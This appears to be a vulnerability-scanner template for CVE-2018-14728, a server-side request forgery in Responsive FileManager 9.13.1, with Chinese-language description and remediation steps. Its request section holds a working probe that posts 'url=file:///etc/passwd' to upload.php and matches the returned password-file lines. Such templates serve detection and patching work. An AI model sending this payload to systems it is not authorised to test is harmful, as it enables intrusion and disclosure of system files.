id: CVE-2018-14728
info:
  name: Responsive filemanager 9.13.1 Server-Side Request Forgery
  author:
  - madrobot
  description: |-
    Responsive FileManager SSRF漏洞
    Responsive FileManager是一款使用PHP语言编写的开源文件管理器，它支持视频、图像和其它文件的上传和管理。

    Responsive FileManager 9.13.1版本中的upload.php文件存在服务器端请求伪造漏洞。
  severity: critical
  remediation: |-
    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁。
    http://www.responsivefilemanager.com/

    临时修复方案：<br />1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。<br />2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。<br />3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。<br />4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。<br />5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  path:
  - '{{BaseURL}}/filemanager/upload.php'
  method: POST
  body: fldr=&url=file:///etc/passwd
